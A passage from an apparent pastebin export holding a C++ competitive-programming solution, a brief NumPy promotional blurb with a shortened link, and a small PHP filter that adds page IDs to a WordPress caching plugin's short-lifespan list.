 #define capital(x) (x>=65&&x<=90)
 #define Tolower(s) transform(s.begin(),s.end(),s.begin(),::tolower);
 #define Toupper(s) transform(s.begin(),s.end(),s.begin(),::toupper); 
 #define all(v) ((v).begin()), ((v).end())
 #define allr(v) ((v).rbegin()), ((v).rend())
 #define updmax(a,b) a=max(a,b)
 #define updmin(a,b) a=min(a,b)
 #define ceil(a,b) ((a/b)+(a%b?1:0))
 /* asc -> 1 2 3 ,des -> 3 2 1 */
 /***********************************************************************************/
 using namespace std;
 void Rofyda_Elghadban(){
  #ifndef ONLINE_JUDGE   
    freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout);
   #endif
    ios_base::sync_with_stdio(false), cin.tie(nullptr), cout.tie(nullptr);
 }

 struct com{
  bool operator()(int l,int r){
    return (l>=50)<(r>=50);
  }
 };

 void solve(){
  int n,sum=0,counter=0,e=0,maxi1=INT_MIN,maxi2=INT_MIN,ans=0;
  cin>>n;
  vector<int>v(n),m,p;
  cin(v);
  for(int i=0;i<n;i++){
    for(int j=i;j<n;j++){
      sum+=v[j];
      if(sum<0){
        maxi1=max(maxi1,ans);
        sum=0;
        ans=0;
      }else{
        ans++;
      }
    }
    for(int k=0;k<i;k++){
      sum+=v[k];
      if(sum<0){
        maxi2=max(maxi2,ans);
        sum=0;
        ans=0;
      }else{
        ans++;
      }
    }
  }
  if((maxi1+maxi2)>n){
    cout<<(maxi1+maxi2)/2<<""\n"";
  }else{
    cout<<maxi1+maxi2<<""\n"";
  }
 }

 int main(){
  Rofyda_Elghadban();
  solve();
 
  return 0;
 }
  "
mXnufvL2,Python NumPy for Data Science,sissou123,Python,Monday 2nd of October 2023 12:33:45 PM CDT,"Python NumPy for Data Science
NumPy (Numerical Python) is a powerful Python library for mathematical and numerical operations. It enhances computational speed and efficiency for numeric calculations, boosting performance by up to 100 times.
for more:https://cuty.io/VTNNQ3caP"
jjqNvW4y,Add CPT to Short Lifespan Pages by post id,swte,PHP,Monday 2nd of October 2023 12:31:54 PM CDT,"add_filter('swift_performance_option_short-lifespan-pages', function($page_ids){
	$page_ids[] = 123;
	$page_ids[] = 456;
	return $page_ids;
});"
